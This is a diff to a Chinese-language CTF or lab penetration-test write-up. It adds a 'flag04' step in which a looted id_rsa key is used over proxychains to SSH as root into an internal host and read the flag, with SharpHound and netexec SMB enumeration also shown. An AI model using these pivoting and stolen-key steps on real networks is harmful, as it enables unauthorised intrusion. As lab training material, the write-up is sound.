@@ -441,7 +441,7 @@ flag{not_write_password_in_txt}
 
 
 
-
+# flag04
 主机 PENTEST\IZMN9U6ZO3VTRNZ 存在 172.23.4.12/172.24.7.16 双网卡：
 ```bash
 ☁  ~  proxychains4 -q nxc smb 172.23.4.12 -M ioxidresolver
@@ -524,3 +524,36 @@ PS C:\Users\usera\.ssh> type .\known_hosts
 172.24.7.23 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBHhESiXRwVnqgTtADKek0fxSQKchkXn7evdU9uFiZ+R0zn9BVBAS1maIfyVAAh6H3wgN2mJ7zG3nvQE7cvKZ5xQ=
 ```
 
+## 登录172.23.4.19
+```bash
+☁  endless  chmod 600 id_rsa          
+☁  endless  ls -la
+总计 1300
+drwxr-xr-x  2 root root    4096  6月 1日 17:39 .
+drwxr-xr-x 11 root root    4096  5月29日 15:06 ..
+-rw-------  1 root root    2622  6月 1日 17:39 id_rsa
+-rw-r--r--  1 root root 1318912  6月 1日 17:20 SharpHound.exe
+☁  endless  proxychains4 -q ssh -i ./id_rsa root@172.23.4.19
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to "store now, decrypt later" attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+
+Welcome to Alibaba Cloud Elastic Compute Service !
+
+Last login: Sun Aug  7 20:15:50 2022 from 172.19.0.251
+root@iZ8vb696kwdecbjpccfyboZ:~# cat /flag
+flag{id_rsa_so_useful!}
+```
+
+
+```
+flag{id_rsa_so_useful!}
+```
